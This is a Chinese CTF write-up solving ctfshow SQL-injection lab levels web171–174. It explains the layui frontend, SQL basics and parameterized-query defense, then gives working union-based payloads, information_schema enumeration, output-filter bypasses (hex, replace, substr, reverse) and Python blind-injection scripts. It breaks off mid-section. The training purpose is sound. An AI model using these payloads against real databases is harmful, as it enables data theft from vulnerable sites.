---
title: "ctfshow-WEB入门（sql注入）"
description: "ctfshow-WEB入门（sql注入）"
image: "/assets/光下的西施.jpg"
date: 2026-11-25
updated: 2026-11-28
categories:
  - 学习
tags:
  - CTF
  - Web
  - 网络安全
  - SQL注入
type: tech
---

## ctfshow-WEB入门（sql注入）

### web171

![image-20261125202654278](/assets/ctfshow-web-sqli/image-20261125202654278.png)

页面上直接把后台拼接 SQL 的代码贴出来了：

```php
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

得到的信息：

- 看这个`$_GET['id']`就可以知道id 是 GET 传进来的，外面套了一层单引号，典型的==字符型注入==
- select 只查了 username 和 password 两列，查出来的东西会显示在页面上
- 条件里写了 `username != 'flag'`，说明出题人特意把 flag 那行藏了起来，但查询语句本身没拦着我们动 id

#### 一些概念与解释

##### Q1：页面上的数据是怎么来的？

先查 id=1，表格里出现 admin / admin。

![image-20261125204752147](/assets/ctfshow-web-sqli/image-20261125204752147.png)

不过这个数据不是后端直接写在页面里的。打开页面源码能看到，表格只是个空壳：

```html
<table id="user" lay-filter="user-filter"></table>
```

![image-20261125204846679](/assets/ctfshow-web-sqli/image-20261125204846679.png)

真正的渲染逻辑在 `js/select.js` 里，用的是 layui 的 table 组件：

```javascript
table.render({
  elem: '#user',
  page: true,        // 开启分页
  url: "api/",       // 数据源
  cols: [[{field:'id'}, {field:'username'}, {field:'password'}]]
});

// 点“查询”时
form.on('submit(*)', function(data){
  table.reload('user_table', { url: 'api/?id=' + data.field['id'] });
  return false;   // 阻止表单提交，页面不刷新
});
```

意思就是：页面只加载一次，之后点“查询”，浏览器在后台单独发一个请求到 `api/`，把输入框里的 id 拼在地址后面，服务器把数据返回给 JS，JS 再填进表格。

整个过程大概这样：

```
打开页面        → 服务器返回 HTML + JS（里面没有数据）
layui 自动请求   → api/?page=1&limit=10
点击查询        → api/?id=1&page=1&limit=10
服务器          → 读 id、拼 SQL、查 MySQL
返回            → JSON
JS 渲染         → 把 JSON 里的 data 填成表格
```

`page=1&limit=10` 也不是我们手写的，是 layui 开了分页后自动带上的分页参数。

服务器返回的 JSON 长这样：

```json
{
  "code": 0,
  "msg": "查询成功",
  "count": 1,
  "data": [{"id":"1","username":"admin","password":"admin"}]
}
```

`code` 是状态，`msg` 是提示，`count` 是总条数，`data` 是当前页的数据。JS 拿到 `data` 后循环生成表格行，就是屏幕上看到的效果。

所以后面抓包或者用工具打的时候，直接请求 `api/?id=...&page=1&limit=10` 就行，返回的是纯 JSON，不用去解析网页。

##### Q2：什么是 layui ？

layui 是一个前端的 UI 组件库，可以理解成网页界面的“现成零件套装”。和 Bootstrap、Element UI、Ant Design 属于同一类东西，在国内的后台系统里特别常见。

它的特点是：

- 一套 CSS + 一堆 JS 组件，引进来就能用
- 常用组件都有现成的：表格、表单、弹窗、导航栏、进度条、上传、分页
- 每个组件用 `layui.use('xxx', function(){...})` 加载，像搭积木
- 2.x 版本底层依赖 jQuery

查看这个靶场的源代码就能够认出是 layui，定位这些关键词，看这些内容就知道了：

```html
<ul class="layui-nav"> ... </ul>                    <!-- 顶部导航 -->
<div class="layui-form"> ... </div>                 <!-- 表单 -->
<table id="user" lay-filter="user-filter"></table>  <!-- 表格 -->
<div class="layui-progress-bar" lay-percent="1/150"></div> <!-- 进度条 -->
```

```javascript
layui.use('table', function(){
  var table = layui.table;
  table.render({ ... });                          // 渲染表格
});

layui.use('form', function(){
  var form = layui.form;
  form.on('submit(*)', function(data){ ... });    // 拦截表单提交
});
```

对这题最关键的是它的 table 组件。它不只是画个表格，还自带这些功能：

- **自动发请求**：给了 `url: "api/"`，它就自己用 Ajax 去拿数据
- **自动分页**：开了 `page: true`，请求里会自动加 `page=1&limit=10`
- **约定返回格式**：只认 `{code, count, data}` 这种 JSON，`code: 0` 表示成功
- **自动渲染**：拿到 `data` 数组后循环生成表格行，不用手写 `<tr><td>`
- **局部刷新**：`table.reload()` 换数据源，页面不跳转

所以这个靶场里“点查询表格变了但页面没刷新”“请求自动带 page/limit”“返回 json 就能显示成表格”，都是 layui 在背后做的。

对做题来说，看到 `layui-*` 的 class 或 `layui.use`，基本就能判断数据是 Ajax + JSON，可以直接抓接口打，不用管页面长什么样。

简单来说：layui 是给网页“化妆 + 装动作”的前端工具包，和 SQL 注入本身没关系，但它决定了数据以什么方式进出浏览器。

##### Q3：SQL 和 MySQL 基础

打注入之前，先补几个最基本的点。

**数据库长什么样**

一个数据库里有若干张表，表里是行和列。用 Excel 类比：库 = 工作簿，表 = sheet，列 = 表头，行 = 一条记录。

**SQL 是干什么的**

SQL 是操作数据库的语言，常用语句分几类：

| 分类 | 作用 | 关键字 |
|---|---|---|
| DDL | 建库建表改结构 | CREATE / ALTER / DROP |
| DML | 增删改数据 | INSERT / UPDATE / DELETE |
| DQL | 查询 | SELECT |
| DCL | 权限 | GRANT / REVOKE |

注入题里基本都是和 SELECT 打交道：

```sql
SELECT 列1,列2 FROM 表 WHERE 条件 ORDER BY 列 LIMIT 偏移,条数;
```

**一些规则：**

- and 的优先级比 or 高，所以 `a and b or c` 等于 `(a and b) or c`
- union 用来把两条查询结果拼在一起，要求两边列数一样
- order by 后面跟数字，表示按第几列排序，注入里常用来数有几列
- limit 控制返回几条

**MySQL 的注释**

- `#` 注释到行尾（MySQL 特有）
- `-- ` 后面必须有个空格才算注释，URL 里一般写成 `--+`
- `/* */` 块注释（`/*! */` 里的内容仍会执行，常用来绕 WAF）

注入时注释符的作用是把后半句 SQL 截掉。

**information_schema**

MySQL 5.0 以后自带一个系统库 information_schema，里面存着所有库名、表名、列名，相当于数据库的“目录”：

- SCHEMATA：所有库名
- TABLES：所有表名
- COLUMNS：所有列名

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
SELECT column_name FROM information_schema.columns WHERE table_name='表名';
```

所以注入拿到库名之后，靠它就能一路把表名、列名翻出来。

**注入大概分几种**

| 类型 | 什么时候用 |
|---|---|
| union 联合注入 | 页面有回显位 |
| 报错注入 | 页面会把数据库报错显示出来 |
| 布尔盲注 | 页面没数据，但真/假两种状态有区别 |
| 时间盲注 | 页面完全没区别，只能靠 sleep 延迟判断 |
| 堆叠注入 | 能一次执行多条语句 |

**怎么防**

根本办法是预编译/参数化查询：SQL 语句写死，用户输入只当参数，不拼字符串；表名、列名这类没法参数化的用白名单。判断一段代码能不能注入，最快的标准就是看它有没有把用户输入拼进 SQL。

#### 题解

##### 先看看能不能进行注入

传一个单引号试试：

```sql
id=1'
```

页面返回异常，说明引号是能被闭合的。再对比 `1' and 1=1--+` 和 `1' and 1=2--+`，一个正常一个报错，那么基本上就是==字符型注入==了。

![image-20261125203312718](/assets/ctfshow-web-sqli/image-20261125203312718.png)



![image-20261127210337486](/assets/ctfshow-web-sqli/image-20261127210337486.png)

![image-20261127210354180](/assets/ctfshow-web-sqli/image-20261127210354180.png)

###### 运行原理：

把四个输入放在一起对比，就能看懂“闭合”是什么意思。

原始 SQL 大概是这样拼接的（真实表是 `ctfshow_user`，3 列）：

```sql
select id,username,password from ctfshow_user
where username != 'flag' and id = '【输入】' limit 1;
```

**1. 正常输入 `1`**

```sql
... and id = '1' limit 1;
```

`'1'` 是完整的字符串，语法正常，返回 admin。

**2. 输入 `1'`**

```sql
... and id = '1'' limit 1;
```

输入里的单引号把原本包着值的字符串提前关掉了，后面原句里的 `'` 又变成了一个新字符串的开头，一直到结尾都没闭合。MySQL 解析到一半发现引号不配对，直接语法错误，后端没有返回正常 JSON，所以接口是空响应。

这个“异常”说明输入的引号被当成 SQL 语法处理了，而不是当成普通字符，这就是“能闭合”。

**3. 输入 `1' and 1=1--+`**

```sql
... and id = '1' and 1=1-- ' limit 1;
```

`-- ` 是注释，把后面多余的 `' limit 1;` 全部注释掉，真正执行的是：

```sql
... and id = '1' and 1=1
```

`1=1` 恒真，整体条件成立，正常返回 admin。

**4. 输入 `1' and 1=2--+`**

```sql
... and id = '1' and 1=2-- ' limit 1;
```

注释后执行：

```sql
... and id = '1' and 1=2
```

`1=2` 恒假，查不到数据。但 SQL 语法是合法的，所以不报错，只是返回空列表。

- 单引号让查询报错：说明输入能破坏 SQL 语法，存在注入点
- `and 1=1` 有数据、`and 1=2` 没数据：说明后面的条件真的被数据库执行了，注入确认
- 顺便还能用 `1'--+` 只闭合、不改条件，返回和 `1` 一样，说明注释符能把后面多余的 SQL 截掉

##### 把藏起来的 flag 捞出来

后台条件是 `username != 'flag' and id = '...'`。and 的优先级比 or 高，所以只要让 and 前面那半截为假，再用 or 接一个恒真的条件，整张表就都出来了。

```sql
id=-1' or 1=1--+
```

![image-20261127211931937](/assets/ctfshow-web-sqli/image-20261127211931937.png)

`id=-1` 在表里不存在，前半段直接假掉，`or 1=1` 让条件恒真。接口支持 limit 参数，默认只回一条，把 limit 调大就能看到所有用户，flag 就躺在 username=flag 那一行。

如果只想精准拿 flag，不用全表：

```sql
id=-1' or username='flag'--+
```

![image-20261127212002214](/assets/ctfshow-web-sqli/image-20261127212002214.png)

### web172

这道题目有只可爱的小猫咪
![image-20261127212622291](/assets/ctfshow-web-sqli/image-20261127212622291.png)

#### 信息收集

打开首页，导航栏的 SELECT 模块下面只有两个展开项：

```html
<dd><a href="select-no-waf-1.php">无过滤注入1</a></dd>
<dd><a href="select-no-waf-2.php">无过滤注入2</a></dd>
```

![image-20261127223044332](/assets/ctfshow-web-sqli/image-20261127223044332.png)

其它模块都写着“暂未开放”，所以能查询的页面就这两个。

##### 可以对比两个界面的信息

`过滤注入2`已经写有flag了，那么应该就是在这个界面进行sql注入

![image-20261127223158261](/assets/ctfshow-web-sqli/image-20261127223158261.png)

![image-20261127223150120](/assets/ctfshow-web-sqli/image-20261127223150120.png)

#### 漏洞探测

```
1'
```

![image-20261127220422333](/assets/ctfshow-web-sqli/image-20261127220422333.png)

空响应说明语法被破坏

```
1' and 1=1--+           -> 正常返回 admin
1' and 1=2--+           -> 合法 SQL，但 data 为空
1' order by 1--+        -> 正常
1' order by 2--+        -> 正常
1' order by 3--+        -> 报错/空  => 只有 2 列
```

![image-20261127220623672](/assets/ctfshow-web-sqli/image-20261127220623672.png)



![image-20261127220638084](/assets/ctfshow-web-sqli/image-20261127220638084.png)

![image-20261127220652245](/assets/ctfshow-web-sqli/image-20261127220652245.png)

![image-20261127220712974](/assets/ctfshow-web-sqli/image-20261127220712974.png)

![image-20261127220729011](/assets/ctfshow-web-sqli/image-20261127220729011.png)

#### 漏洞验证与利用，union 拿数据

先试最小的 union：

```sql
100' union select 1,2--+
```

或者使用下面这个也可以

```
-1' union select 1,2--+
```

拼接后实际执行的是：

```sql
select username,password from ctfshow_user2
where username != 'flag' and id = '100'
union select 1,2
```

`-- ` 把后面的 `' limit 1;` 注释掉。前半句 `id='100'` 查不到东西，后半句 `select 1,2` 直接造一行数据，拼起来就只剩我们这一行：

```json
{"username":"1","password":"2"}
```

这一步说明了三件事情：

- 列数是 2（多一列少一列都会报错）
- 两个位置都有回显
- union被执行了（数据库里根本没有 `(1,2)` 这行数据）

注意，不能用1，我们的目标是是让前半句查空：

| 输入 | 返回 |
|---|---|
| `1' union select 1,2--+` | admin 和 (1,2)，共 2 行 |
| `-1' union select 1,2--+` | 只有 (1,2) |
| `100' union select 1,2--+` | 只有 (1,2) |

`-1` 和 `100` 效果一样，都是表里不存在的 id；用 `1` 会把 admin 也带出来，结果不干净。另外如果 `limit 1` 没被注释掉，也只有前半句查空时，union 的行才留得下来。

![image-20261127220845621](/assets/ctfshow-web-sqli/image-20261127220845621.png)

#### 拿到库名、表名、列名

```sql
-1' union select 1,database()--+
```

![image-20261127224503011](/assets/ctfshow-web-sqli/image-20261127224503011.png)

```
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'--+
```

![image-20261127224517864](/assets/ctfshow-web-sqli/image-20261127224517864.png)

```
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user2'--+
```

![image-20261127224529945](/assets/ctfshow-web-sqli/image-20261127224529945.png)

这里用 `group_concat()` 是为了避开接口的去重：如果写成 `union select 1,table_name`，两行结果的 username 都是 `1`，会被按第一列去重合并成一行，只看得到一个表名。把多个名字拼进 password 这一列（`group_concat`），或者把 `table_name` 放到第一列，就能完整显示。

#### 拖全表，为什么只看到 4 行

```sql
-1' union select username,password from ctfshow_user2--+
```

![image-20261127224549820](/assets/ctfshow-web-sqli/image-20261127224549820.png)

拼接后：

```sql
select username,password from ctfshow_user2 where username != 'flag' and id = '-1'
union select username,password from ctfshow_user2
```

前半句查空，后半句把整张表拖出来。但实际只返回了 4 行（admin、user1、user2、userAUTO），不是 25 行。

**原因有两个：**

1. 表里有 25 行（`count(*)` 实测），但接口对结果**按第一列 username 去重**，同名只留一条。
2. username 为 flag 的那一行被返回逻辑过滤掉了。

验证去重很简单，把第一列换成唯一的值，就能看到全部 25 行。

把第一列换成 id：

```sql
-1' union select id,password from ctfshow_user2--+
```

返回 25 行，第一列是 1、2、3……26，每行都不同，去重失效；而且 flag 行的 username 变成了 `26`，连检查都绕过了，密码直接是 flag：

![image-20261127230141402](/assets/ctfshow-web-sqli/image-20261127230141402.png)

或者把 username 和 id 拼起来：

```sql
-1' union select concat(username,id),password from ctfshow_user2--+
```

![image-20261127230246847](/assets/ctfshow-web-sqli/image-20261127230246847.png)

第一列变成 `admin1`、`user12`、`flag26`…… 每行都唯一，同样 25 行；flag 行的 username 是 `flag26`，不等于 `flag`，也出来了。

这两个写法的本质一样：**去重是按第一列的值做的，只要让第一列每行都不一样，就能看到全部数据。**

#### 返回逻辑：过滤的是结果，不是输入

页面给的代码：

```php
if($row->username !== 'flag'){
  $ret['msg']='查询成功';
}
```

- `$row` 是查出来的当前行
- `$row->username` 是这一行的 username 值
- `!==` 是严格不等于（值和类型都不同）
- 整句意思：username 不是字符串 `'flag'` 才提示查询成功；是的话这一行就被拦掉

**它检查的是“查出来的结果”，不是“输入的 payload”。**

完整的数据流是这样：

```
你输入的 id
  → PHP 拼成 SQL（这里没做任何过滤）
  → MySQL 执行，返回若干行
  → PHP 检查每一行的 $row->username
  → 不等于 flag 就放进结果，等于 flag 就丢掉
  → 转成 JSON 给前端
```

检查点只有一个：PHP 拿到结果行之后，看这一行的 username 列。你输入里有没有 `flag`，它根本不看。

比如这条 payload 里写着 `username='flag'`：

```sql
-1' union select 1,password from ctfshow_user2 where username='flag'--+
```

![image-20261127230351059](/assets/ctfshow-web-sqli/image-20261127230351059.png)

如果后端做的是“输入过滤”，它大可以把这条请求拦掉。但它没拦，而是让 SQL 正常执行，最后看结果行是 `(1, 密文)`，`$row->username` 是 `1`，`1 !== 'flag'`，通过。flag 两个字只出现在 WHERE 条件里，没出现在返回行的 username 列里。

#### 两种绕过

思路一：username 位置填个常量，password 位置取 flag

```sql
-1' union select 1,password from ctfshow_user2 where username='flag'--+
```

![image-20261127224849952](/assets/ctfshow-web-sqli/image-20261127224849952.png)

思路二：利用 `!==` 区分大小写

```sql
-1' union select UPPER(username),password from ctfshow_user2 where username='flag'--+
```

![image-20261127224910090](/assets/ctfshow-web-sqli/image-20261127224910090.png)

`FLAG !== flag`，检查同样通过。

### web173

上一题是`过滤注入2`，那么这一题当然是`过滤注入3`页面进行sql注入啦

![image-20261128095538395](/assets/ctfshow-web-sqli/image-20261128095538395.png)

#### php代码逻辑

```
//检查结果是否有flag
if(!preg_match('/flag/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```

这是一段**输出黑名单过滤**代码：

**1. `json_encode($ret)`**

`$ret` 是一个数组（查询结果），`json_encode` 把整个数组转成 JSON 字符串，比如：

```php
$ret = ['id'=>1,'data'=>'flag{abc}'];
// 转成：{"id":1,"data":"flag{abc}"}
```

这样不管 flag 出现在数组的**键名还是值**里，都会被搜到。

**2. `preg_match('/flag/i', ...)`**

正则匹配：

- `flag`：要找的字符串
- 两个 `/` 是正则的分隔符
- `i`：**不区分大小写**，所以 `flag`、`FLAG`、`Flag`、`fLaG` 全部能匹配上
- 返回值：匹配到返回 `1`，没匹配到返回 `0`，出错返回 `false`

**3. 前面的 `!`（取反）**

`!preg_match(...)` 的意思是：**结果里没有 "flag" 这个词时，条件才成立**。

**4. 整体逻辑**

- 结果里**不含** flag → 正常设置 `$ret['msg'] = '查询成功'`，数据正常返回
- 结果里**含** flag → 不进 if，不设置成功提示（通常配合其他逻辑，把结果拦截或吞掉）

#### 探测

```
1' order by 3--+   -> 正常
1' order by 4--+   -> 报错      => 3 列
-1' union select 1,2,3--+  -> {"id":"1","username":"2","password":"3"}
```

![image-20261128100508604](/assets/ctfshow-web-sqli/image-20261128100508604.png)

![image-20261128100601848](/assets/ctfshow-web-sqli/image-20261128100601848.png)

![image-20261128100704596](/assets/ctfshow-web-sqli/image-20261128100704596.png)

#### payload作用层

一次请求从发出到收到回复，中间有四个位置可以放“检查”，同一个 payload 在不同层的效果完全不同：

```
浏览器输入
   ↓
① 输入侧检查（对传参：你发来的字符串）
   ↓
② SQL 执行（数据库本身的规则，不算"过滤"但会拦）
   ↓
③ 结果处理（PHP 逐行检查查出来的数据）
   ↓
④ 输出侧检查（对最终响应的整体文本）
   ↓
浏览器收到
```

- **① 输入侧**：查“你说了什么”——WAF 拦 `select`、转义引号、删关键字都属于这层。171~173 都没有这层，所以 payload 里写 `username='flag'` 畅通无阻
- **② SQL 执行**：数据库自己的规则——union 列数不匹配、语法错误都会被拦，`order by` 数列数试的就是这层
- **③ 结果处理**：查“查出来的每一行”——web172 的 `username !== 'flag'` 逐行丢行就是这层
- **④ 输出侧**：查“最终发出去的整段文本”——web173 的 `/flag/i` 扫整个 JSON 就是这层

#### 五种绕过（让输出里不出现连续的 f-l-a-g）

检查器扫的是**最终 JSON 文本**，发回浏览器的文本里，不能出现连续的 f、l、a、g 四个字母（任何大小写）。

哪些内容会进这段 JSON？

| 列 | 内容 | 会不会触发 |
|---|---|---|
| id | 数字（1、26…） | 不会 |
| username | flag 行的值是 `'flag'` | **会，唯一触发点** |
| password | `ctfshow{uuid}` | 不会（uuid 里没有 flag 字样） |

所以正则只看“回显出来的文本长什么样”，不看“数据库里真实存的是什么”。数据没变，变的是表示形式——四个 payload 靠的都是这一点。

##### username 位填常量，只回 password

```
-1' union select 1,2,password from ctfshow_user3 where username='flag'--+
```

union 后半句是 `select 1,2,password ... where username='flag'`：数据库里筛出的那行是 `(26, 'flag', 'ctfshow{...}')`，但 SELECT 列表里**根本没有 username**，第二列用常量 `2` 占位。所以返回行是 `(1, 2, 'ctfshow{...}')`，JSON 里没有 f-l-a-g → 放行，flag 在 password 列原样拿到。

生效原因：**不回显那个会触发检查的字段，用常量占位。**

![image-20261128103741064](/assets/ctfshow-web-sqli/image-20261128103741064.png)

##### hex 编码：username 变成 666C6167

```
-1' union select id,hex(username),password from ctfshow_user3 where username='flag'--+
```

`hex()` 是 MySQL 内置函数，把字符串转成十六进制：

```
f → 66
l → 6C
a → 61
g → 67

hex('flag') = '666C6167'
```

返回行变成 `(26, '666C6167', 'ctfshow{...}')`，JSON 里 username 是一串十六进制字符，正则匹配不到 → 放行。拿到 `666C6167` 就等于拿到了 flag。

生效原因：**hex 是可逆编码。数据还是那个数据，只是换了一种文本表示；正则匹配的是文本，表示变了它就“瞎”了。**

![image-20261128103850023](/assets/ctfshow-web-sqli/image-20261128103850023.png)



##### 字符替换：glag

```
-1' union select id,replace(username,'f','g'),password from ctfshow_user3 where username='flag'--+
```

`replace('flag','f','g')` = `'glag'`，f-l-a-g 的连续序列被破坏成 g-l-a-g，正则匹配不上 → 放行。

![image-20261128103921710](/assets/ctfshow-web-sqli/image-20261128103921710.png)

##### substr 拆开分家：f 和 lag 分开放

```
-1' union select id,substr(username,1,1),concat(substr(username,2),password) from ctfshow_user3 where username='flag'--+
```

![image-20261128122114133](/assets/ctfshow-web-sqli/image-20261128122114133.png)

先看 substr 到底切了什么。username 的值是 flag，一共 4 个字符：

```
位置:  1    2    3    4
字符:  f    l    a    g
```

- `substr(username,1,1)`：从第 1 位取 1 个 → `f`
- `substr(username,2)`：从第 2 位取到结尾 → `lag`

payload 里这两半的去向：f 放进 username 列，lag 拼到 password 前面，所以返回行是 `(26, 'f', 'lagctfshow{...}')`。

对比两种情况下实际发出的 JSON 文本。

不拆分时（假设后端不做检查），JSON 会是这样：

```
{"code":0,"msg":"查询成功","count":1,"data":[{"id":"26","username":"flag","password":"ctfshow{...}"}]}
                              这里^^^^直接就是连续的 f-l-a-g → 正则命中 → 被拦
```

拆分后的实测原文：

```
{"code":0,"msg":"查询成功","count":1,"data":[{"id":"26","username":"f","password":"lagctfshow{57f8b111-4f83-42ab-b97f-8820174adcc1}"}]}
```

把拆分后的文本逐字排开，看 f 的后面是什么：

```
... " u s e r n a m e " : " f  "  ,  "  p  a  s  s  w  o  r  d  "  :  "  l  a  g  c  t  f  s  h  o  w  { ...
                         ↑                        ↑
                      f 在这里                 lag 在这里
```

- f 的下一个字符是引号，不是 l → 匹配在这里断掉
- lag 的前面是引号，不是 f → 也凑不成
- f 和 l 中间隔着 `","password":"` 这一整串

正则找 flag 的条件是 f 后面紧跟 l、l 后面紧跟 a、a 后面紧跟 g，是连续的f-l-a-g。拆分后的文本里 f 的下一个字符是引号，全文其它地方也没有连续的 f-l-a-g（password 里的 ctfshow 是 c-t-f-s，f 后面跟的是 s），所以 preg_match 找不到匹配，数据放行。

username 列的 f + password 开头的 lag = flag（确认这就是 flag 用户），password 真正的值去掉开头 3 个字符 lag，就是 `ctfshow{...}`。

拆分把一个词的四个字母塞进两个不同的区域，中间隔着 JSON 的引号和键名，正则在整段文本里拼不出 flag 这个词。

另一种切法也行：把 fl 拼到 id 后面，ag 放 username 列：

```
-1' union select concat(id,substr(username,1,2)),substr(username,3),password from ctfshow_user3 where username='flag'--+
```

![image-20261128122131215](/assets/ctfshow-web-sqli/image-20261128122131215.png)

1. **两半不能落进同一个字段**：如果用 concat 把两半拼回 `flag` 再放进一列，等于没绕，直接被拦
2. **片段在 JSON 文本里不能恰好相邻**：好在 JSON 的引号和键名会天然把片段隔开，所以拆开放相邻字段通常也安全

##### 使用reverse逆向username

```
-1' union select id,reverse(username),password from ctfshow_user3 where username='flag'--+
```

![image-20261128122425558](/assets/ctfshow-web-sqli/image-20261128122425558.png)

`reverse('flag')` = `'galf'`，四个字母倒着输出。JSON 里只有 galf，正则在整段文本里找不到连续的 f-l-a-g → 放行；拿到 `galf` 倒着读就是 flag，信息没丢。

### web174

还是进入到`select-no-waf-4.php`界面里

![image-20261128180954247](/assets/ctfshow-web-sqli/image-20261128180954247.png)

#### php代码逻辑

```
//检查结果是否有flag
if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```

对比 web173 的 `/flag/i`，正则多了一段：竖线 `|` 表示“或”，也就是**整个返回 JSON 里既不能出现 flag 字样，也不能出现任何数字 0-9**（不分大小写）。

查询语句一样：

```php
$sql = "select username,password from ctfshow_user4 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

#### 探测

```
1' order by 2--+              -> 正常
1' order by 3--+              -> 报错      => 2 列
-1' union select 'a','b'--+  -> {"username":"a","password":"b"}   纯字母能过
-1' union select 'a','b1'--+ -> 查询失败，data 空 —— 输出里有一个数字就被拦
```

![image-20261128181209725](/assets/ctfshow-web-sqli/image-20261128181209725.png)

![image-20261128181226355](/assets/ctfshow-web-sqli/image-20261128181226355.png)

![image-20261128181258922](/assets/ctfshow-web-sqli/image-20261128181258922.png)

![image-20261128181321446](/assets/ctfshow-web-sqli/image-20261128181321446.png)

问题出在这里：flag 本身是 `ctfshow{uuid}`，uuid 里全是数字。173 方法（hex、replace 换一个字母、substr、reverse）不起作用了，hex 的输出是 0-9a-f，本身就带数字；base64 也带数字。

#### 法1：嵌套 replace，把数字换成大写字母

思路：换一种文本表示，让黑名单匹配不到，同时自己能还原。这次要把 0-9 十个数字全部换掉。

映射选**大写字母** A-J ：返回的 `ctfshow{uuid}` 全是小写，大写字母不会和原有内容混淆，逆运算一眼可辨。

```
0→A  1→B  2→C  3→D  4→E  5→F  6→G  7→H  8→I  9→J
```

十层 replace 手写容易套错，用 python 脚本一步跑完（生成 → 发请求 → 解码），可以在桌面建一个py然后在终端进行调用：

```python
import requests
from urllib.parse import quote

url = 'http://【靶场地址】/api/v4.php'

# 1. 生成十层嵌套 replace：数字 -> 大写字母
t = 'password'
for d, l in zip('0123456789', 'ABCDEFGHIJ'):
    t = f"replace({t},'{d}','{l}')"

# 2. 拼 payload 发请求（safe='+' 让 --+ 的加号保持原样）
payload = f"-1' union select 'a',{t} from ctfshow_user4 where username='flag'--+"
r = requests.get(url + '?id=' + quote(payload, safe='+'), verify=False)

# 3. 取回编码结果，把大写字母逆映射回数字（A→0 …… J→9）
enc = r.json()['data'][0]['password']
flag = ''.join(str('ABCDEFGHIJ'.index(c)) if c.isupper() else c for c in enc)
print(flag)
```

![image-20261128185034597](/assets/ctfshow-web-sqli/image-20261128185034597.png)

`verify=False` 是本机证书链缺颁发者、requests 报 SSL 证书错误时才需要加的；换台机器报错消失就去掉。

或者使用sql注入方式，payload：

```sql
-1' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','A'),'1','B'),'2','C'),'3','D'),'4','E'),'5','F'),'6','G'),'7','H'),'8','I'),'9','J') from ctfshow_user4 where username='flag'--+
```

十层嵌套从里往外看：最里层先把 `0` 换成 `A`，然后逐层把 `1` 换成 `B`……最后把 `9` 换成 `J`。数字换完就变成字母，不会再产生新的数字，所以不存在替换串扰。

![image-20261128185136198](/assets/ctfshow-web-sqli/image-20261128185136198.png)

返回：

```json
{"username":"a","password":"ctfshow{GDadcDHe-CCJa-EEcI-JIJG-HJFGdbfEHaee}"}
```

本地做逆运算，大写字母换回数字（A→0、B→1……J→9）：

```python
# 本地逆运算：把加密结果里的大写字母换回数字
# enc 换成你实际拿到的编码结果
enc = 'ctfshow{GDadcDHe-CCJa-EEcI-JIJG-HJFGdbfEHaee}'

# 加密时用的映射是 数字 -> 大写字母（0→A … 9→J），逆运算就是反着查
mapping = {
    'A': '0', 'B': '1', 'C': '2', 'D': '3', 'E': '4',
    'F': '5', 'G': '6', 'H': '7', 'I': '8', 'J': '9',
}

flag = ''
for c in enc:
    if c in mapping:      # 是我们替换出来的大写字母 → 换回对应的数字
        flag += mapping[c]
    else:                 # 小写字母、-、{、} 这些原样保留
        flag += c

print(flag)
```

#### 一个编码坑

用 python 的 `urllib.parse.quote()` 给 payload 做 URL 编码时，默认会把 `+` 编码成 `%2B`。这样 `--+` 到了服务器就变成字面加号，注释失效，接口直接空响应。要写成 `quote(payload, safe="+")`，让 `+` 保持原样，PHP 才会把它解码成空格。手写 URL 或在浏览器输入框里打就没问题。

同一个 payload `1' and 1=1--+`，只改加号的发送方式：

| 发送方式 | 服务器收到 | 结果 |
|---|---|---|
| `--%2B`（quote 默认） | 字面加号，注释失效 | 空响应（语法错误） |
| `--+`（原样发送） | `-- ` 合法注释 | admin 正常返回 |

原理：URL 里的加号有两个身份——PHP 解析 GET 参数时按老约定把 `+` 当**空格**；但 python 的 `quote()` 默认把 `+` 当特殊字符编码成 `%2B`，服务器解码回来就还原成了字面加号。而 MySQL 要求 `--` 后面必须跟空白符才算注释（Q3 讲过），字面加号凑不上，后面那段 `' limit 1;` 就留下来把语法弄坏了。

#### 法2：布尔盲注，一个字符一个字符猜

replace 拿不到的场景还有个万能——盲注。利用的是探测阶段已经确认的事实：**条件为真时返回 admin，条件为假时返回空**。

```sql
1' and 1=1--+    -> 返回 admin（真）
1' and 1=2--+    -> 返回空（假）
```

把 `1=1` 换成对 flag 每个字符的判断：

```sql
1' and ascii(substr((select password from ctfshow_user4 where username='flag'),1,1))>100--+
```

三个函数分工：`substr(...,i,1)` 取第 i 个字符，`ascii()` 转成数字，外面比较大小。对每个位置用二分法（先问 >64？再问 >96？……），7 次左右就能锁定一个字符。

拆开看这条 payload 的三层：

- **最内层** `(select password ... where username='flag')`：子查询，先把 flag 的密码单独查出来当原料
- **`substr(原料, i, 1)`**：从第 i 位取 1 个字符 → 一次只拿一个字符
- **`ascii(字符) > 数字`**：字符变数字后才能比大小

真假信号来自最外层的 `1' and (比较结果)`：比较为真 → `and` 保住 id='1' 那行 → 返回 admin；为假 → 整个 WHERE 为假 → 空响应。

实际问答记录（在靶场上猜第一个字符的完整过程）：

| 问题（发给服务器） | 响应 | 得知范围 |
|---|---|---|
| ascii > 79？ | admin（真） | 80~126 |
| ascii > 103？ | 空（假） | 80~103 |
| ascii > 91？ | admin（真） | 92~103 |
| ascii > 97？ | admin（真） | 98~103 |
| ascii > 100？ | 空（假） | 98~100 |
| ascii > 99？ | 空（假） | **锁定 99 → chr(99) = 'c'** |

6 次请求锁定一个字符。95 个候选字符用二分最多 7 问（2⁷ = 128 > 95），逐个问“=97？=98？”最坏得问 95 次。

完整脚本：

```python
import requests

url = 'http://【靶场地址】/api/v4.php'
flag = ''

for i in range(1, 60):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"?id=1' and ascii(substr((select password from ctfshow_user4 where username='flag'),{i},1))>{mid}--+"
        r = requests.get(url + payload)
        if 'admin' in r.text:      # 条件为真，字符比 mid 大
            low = mid + 1
        else:                      # 条件为假
            high = mid
    if low <= 32 or low >= 127:
        break                      # 取不到字符了，结束
    flag += chr(low)
    print(flag)
```

几百个请求换一个 flag，比 replace 慢，但它只依赖“能区分真假”，任何有回显差异的注入点都能用。

#### 法3：to_base64 + replace

目的：找一个“输出里没有数字”的编码形式。hex 不行（0-9a-f 自带数字），base64 也一样——拿本题 flag 实测：

```
原 flag: ctfshow{uuid}
